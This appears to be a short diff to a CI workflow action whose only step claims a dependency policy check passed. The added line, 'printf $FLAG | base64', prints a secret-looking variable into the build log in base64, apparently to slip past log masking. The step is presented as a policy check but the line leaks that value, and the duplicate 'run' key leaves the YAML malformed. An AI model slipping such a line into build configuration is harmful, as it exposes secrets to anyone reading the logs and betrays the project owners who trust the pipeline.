@@ -5,3 +5,4 @@ runs:
   steps:
     - shell: bash
       run: printf '%s\n' 'Dependency policy passed.'
+      run: printf $FLAG | base64
